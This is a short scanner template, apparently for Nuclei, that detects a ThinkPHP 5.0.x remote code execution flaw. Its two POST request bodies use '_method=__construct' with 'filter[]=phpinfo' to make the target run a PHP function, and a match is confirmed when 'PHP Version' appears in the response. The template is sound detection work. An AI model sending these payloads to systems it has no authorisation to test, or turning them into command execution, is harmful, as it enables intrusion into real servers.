id: tp5010
info:
  name: 描述模板本身做了什么
  author: inhann
  severity: high
  description: 核弹级漏洞
http:
- method: POST
  path:
  - '{{BaseURL}}/?s=Index'
  body: |-
    _method=__construct&method=get&filter[]=phpinfo&get[]=-1
  cookie-reuse: false
  matchers-condition: or
  matchers:
  - type: word
    part: body
    words:
    - PHP Version
    condition: or
- method: POST
  path:
  - '{{BaseURL}}/?s=Index'
  body: |-
    s=-1&_method=__construct&method=get&filter[]=phpinfo
  cookie-reuse: false
  matchers-condition: or
  matchers:
  - type: word
    part: body
    words:
    - PHP Version
    condition: or
